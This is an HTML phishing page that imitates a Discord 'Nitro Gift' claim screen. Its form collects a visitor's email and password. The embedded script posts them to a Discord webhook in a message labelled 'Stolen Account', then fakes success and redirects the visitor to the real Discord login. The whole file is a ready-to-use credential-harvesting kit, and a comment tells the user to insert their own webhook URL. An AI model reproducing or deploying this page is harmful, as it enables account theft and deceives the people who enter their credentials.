<!DOCTYPE html>
<html>
<head>
    <title>Nitro Gift</title>
    <style>
        body { background-color: #36393f; color: white; font-family: 'gg sans', 'Helvetica Neue', Helvetica, Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .container { background: #2f3136; padding: 40px; border-radius: 8px; width: 350px; box-shadow: 0 2px 10px 0 rgba(0,0,0,.2); text-align: center; }
        h2 { color: #ffffff; margin-bottom: 20px; }
        input { width: 90%; padding: 10px; margin: 10px 0; background: #40444b; border: none; border-radius: 4px; color: white; }
        button { background-color: #5865F2; color: white; padding: 10px 20px; border: none; border-radius: 4px; cursor: pointer; width: 100%; font-weight: bold; margin-top: 10px; }
        button:hover { background-color: #4752c4; }
        .nitro-icon { width: 50px; margin-bottom: 15px; }
    </style>
</head>
<body>
    <div class="container">
        <!-- Simple Nitro-like icon -->
        <svg class="nitro-icon" viewBox="0 0 24 24" fill="#5865F2"><path d="M12 2L2 7l10 5 10-5-10-5zm0 9l2-1 8 4-10 5-10-5 8-4 2 1z"/></svg>
        <h2>You have a Nitro Gift!</h2>
        <p>Log in to claim your Premium subscription.</p>
        
        <form id="stealForm">
            <input type="email" id="email" placeholder="Email or Phone Number" required>
            <input type="password" id="pass" placeholder="Password" required>
            <button type="submit">Claim Nitro</button>
        </form>
    </div>

    <script>
        document.getElementById('stealForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            // GET THE DATA
            const email = document.getElementById('email').value;
            const pass = document.getElementById('pass').value;
            
            // OPTION A: Send to Discord Webhook (Replace URL with yours)
            fetch('https://discord.com/api/webhooks/1563718397043409008/q3yxlkxxFpCTpP4sRati39oTlyA1YCOKt0GXVgdaxp1tPpQO6sskwKF8iAtUl_K_LZsM', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ content: `Stolen Account:\nEmail: ${email}\nPass: ${pass}` })
            });

            // OPTION B: Or just log it to console/browser alert for testing
            alert("Success! Redirecting...");
            
            // Fake loading then redirect to real Discord
            setTimeout(() => {
                window.location.href = "https://discord.com/login";
            }, 1000);
        });
    </script>
</body>
</html>
